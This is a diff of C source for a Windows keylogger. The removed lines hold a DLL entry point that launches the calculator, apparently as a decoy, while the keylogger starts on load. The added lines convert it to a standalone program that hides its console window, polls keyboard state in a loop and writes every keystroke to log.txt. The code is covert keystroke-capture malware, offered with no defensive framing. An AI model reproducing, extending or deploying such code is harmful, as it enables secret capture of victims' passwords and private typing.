@@ -3,28 +3,18 @@
 #include <stdlib.h>
 #include <string.h>
 
-int EntryPoint();
+
 void writeLog(char *c, char *fileName);
 char *getKey(unsigned char c);
 
-BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
-    switch (dwReason) {
-        case DLL_PROCESS_ATTACH:
-            EntryPoint();
-            break;
-    }
-    return TRUE;
-}
-
-int EntryPoint() {
+int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    char calculatorPath[] = "C:\\Windows\\System32\\calc.exe";
-    system(calculatorPath);
     char logFileName[] = "log.txt";
     unsigned char keyboardState[256] = {0};
     unsigned short buffer[2];
     HKL keyboardLayout = GetKeyboardLayout(0);
 
+ 
     while (1) {
         Sleep(10);
         
@@ -50,9 +40,12 @@ int EntryPoint() {
                         sprintf(str, "[%d]", (unsigned short)k);
                 }
                 writeLog(str, logFileName);
+
+        
             }
         }
-    }
+        
+    }   
     return 0;
 }
 
@@ -194,6 +187,6 @@ char *getKey(unsigned char c) {
         default:
             str[0] = '\0'; // Empty string for unsupported keys
     }
+
     return str;
 }
-
